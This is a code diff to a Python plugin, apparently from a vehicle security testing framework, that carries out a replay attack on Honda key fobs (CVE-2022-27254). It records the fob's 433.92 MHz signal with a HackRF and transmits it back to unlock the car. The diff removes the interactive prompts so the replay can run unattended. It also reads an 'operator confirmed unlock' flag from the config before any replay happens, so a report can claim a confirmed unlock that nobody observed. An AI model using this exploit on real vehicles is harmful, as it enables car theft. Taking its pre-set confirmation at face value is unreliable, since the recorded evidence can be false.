@@ -13,6 +13,7 @@ import subprocess
 import sys
 import os
 import shutil
+import tempfile
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class HondaReplayPlugin(IVIVulnerabilityPlugin):
@@ -32,8 +33,14 @@ class HondaReplayPlugin(IVIVulnerabilityPlugin):
         super().__init__(target_config, logger)
         self.results["cve_id"] = "CVE-2022-27254"
         self.freq = str(target_config.get("frequency", "433920000")) # 433.92 MHz
-        self.sample_rate = "2000000"
-        self.file_name = "signal.raw"
+        self.sample_rate = str(target_config.get("sample_rate", "2000000"))
+        self.record_seconds = int(target_config.get("record_seconds", 5))
+        self.auto_replay = target_config.get("auto_replay") in (True, "true", "True", "1", 1)
+        self.operator_confirmed_unlock = target_config.get("operator_confirmed_unlock") in (True, "true", "True", "1", 1)
+        self.file_name = target_config.get("capture_path") or os.path.join(
+            tempfile.gettempdir(),
+            f"autosec_keyfob_{os.getpid()}.raw",
+        )
 
     def check_prerequisites(self):
         # 检查 hackrf_transfer 工具是否存在
@@ -44,34 +51,48 @@ class HondaReplayPlugin(IVIVulnerabilityPlugin):
 
     def exploit(self):
         self.logger.info("请准备好 HackRF 设备。")
-        input("按 Enter 键开始录制信号（请在此时按下车钥匙解锁键）...")
+        self.logger.info(
+            "非交互式执行模式：将立即录制信号。请在任务启动后触发车钥匙信号。"
+        )
         
         # 1. 录制信号
-        self.logger.info("正在录制信号 (5秒)...")
+        sample_count = str(max(self.record_seconds, 1) * int(self.sample_rate))
+        self.logger.info(f"正在录制信号 ({self.record_seconds}秒)...")
         try:
             # -r 接收, -f 频率, -s 采样率, -n 采样数 (2M * 5s = 10M samples)
-            subprocess.run(["hackrf_transfer", "-r", self.file_name, "-f", self.freq, "-s", self.sample_rate, "-n", "10000000"], check=True)
+            subprocess.run(
+                ["hackrf_transfer", "-r", self.file_name, "-f", self.freq, "-s", self.sample_rate, "-n", sample_count],
+                check=True,
+                timeout=self.record_seconds + 10,
+            )
             self.logger.info("信号录制完成。")
-        except subprocess.CalledProcessError:
-            self.logger.error("录制失败，请检查设备连接。")
+        except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
+            self.logger.error(f"录制失败，请检查设备连接: {exc}")
             return self.results
 
-        input("录制完成。请确认车辆已锁闭，按 Enter 键尝试重放攻击...")
+        if not self.auto_replay:
+            self.results["vulnerable"] = False
+            self.results["evidence"] = (
+                f"RF signal captured to {self.file_name}; replay was not executed because auto_replay was not enabled."
+            )
+            return self.results
 
         # 2. 重放信号
         self.logger.info("正在重放信号...")
         try:
-            subprocess.run(["hackrf_transfer", "-t", self.file_name, "-f", self.freq, "-s", self.sample_rate], check=True)
+            subprocess.run(
+                ["hackrf_transfer", "-t", self.file_name, "-f", self.freq, "-s", self.sample_rate],
+                check=True,
+                timeout=int(self.params.get("replay_timeout_seconds", 20)),
+            )
             self.logger.info("重放完成。")
-            
-            # 询问结果
-            verdict = input("车辆是否解锁？(y/n): ")
-            if verdict.lower() == 'y':
+
+            if self.operator_confirmed_unlock:
                 self.results["vulnerable"] = True
-                self.results["evidence"] = "User confirmed vehicle unlock via replay."
+                self.results["evidence"] = "Operator confirmed vehicle unlock via replay."
             else:
                 self.results["vulnerable"] = False
-                self.results["evidence"] = "Replay failed to unlock vehicle."
+                self.results["evidence"] = "Replay transmitted; no operator confirmation of unlock was provided."
                 
         except Exception as e:
             self.logger.error(f"重放失败: {e}")
